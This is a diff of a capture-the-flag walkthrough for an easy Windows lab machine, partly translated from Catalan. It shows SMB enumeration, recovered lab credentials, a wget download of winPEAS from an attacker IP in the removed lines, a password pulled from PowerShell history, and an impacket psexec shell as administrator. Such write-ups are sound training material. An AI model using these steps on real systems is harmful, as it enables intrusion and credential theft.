@@ -1,7 +1,7 @@
 # Intro
-| Dificulty | OS | Start Date | End Date | Help? |
+| Dificulty | OS | Start Date | End Date |
 |---|---|---|---|---|
-| Very Easy | Windows | 26/05/2022 | 28/05/2022 | Yes |
+| Very Easy | Windows | 26/05/2022 | 28/05/2022 |
 
 
 # Thought process
@@ -32,6 +32,7 @@ $ smbclient -N \\\\@Target_IP\\folder_name
 
 In these file we can see that there's a usrname:password.
 
+> Bounty
 ```
 ARCHETYPE\ sql_svc
 M3g4c0rp123
@@ -161,57 +162,18 @@ cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 ```
 
 The file contains Administrator password.
+
 > Bounty
 ```
 administrator
 MEGACORP_4dm1n!!
 ```
 
-
----
-
-# Privilegie Escalation
-
-Utilitzarem l'eina WinPeas. Primer descarreguem en local i despres la solicitem desde la màquina. 
-(Continuar fent escolta en el port 80 amb python)
-[Link descarrega](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
-
-Executar escolta en port 80 desde l'ubicació on està el winPEAS. Fer `wget` de l'arxiu
-
-```powershell
-wget http://10.10.14.123/winPEASx64.exe -outfile winPEASx64.exe
-```
-[//]: S'ha d'estar en un directori on l'usuari tingui permissos.
-
-Executem el binari utilitzant la reverse shell
-```powershell
-.\winPEASx64.exe
-```
-
-Podem observat que hi ha `SeImpersonatePrivilege` [Link](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) i aquest es vulnerable a "[juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)". Però abans mirem si hi ha arxius que puguin contindre passwords.
-
-Com que 'sql_svc' es un usuari normal, podem mirar el equivalent al '.bashrc' de powershell.
-```powershell
-cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
-```
-
-El fitxer conté la contrasenya de administrador.
-administrator:MEGACORP_4dm1n!!
-
-Ara podem executar `psexec.py` desde impacket per tenir una shell com Administrador.
+Now execute `psexec.py` from impacket to get a shell as the administrator
 
 ```bash
-$ python3 psexec.py administrator@Target_IP
+~/HTB/impacket/examples
+└─$ python3 psexec.py administrator@Target_IP
 ```
-![[Pasted image 20220528174919.png]]
-La root flag es troba en el desktop de l'usuari
 
-
-
-
-
-
-
-
-
-
+The root flag can be found in the Desktop of the Administrator user.
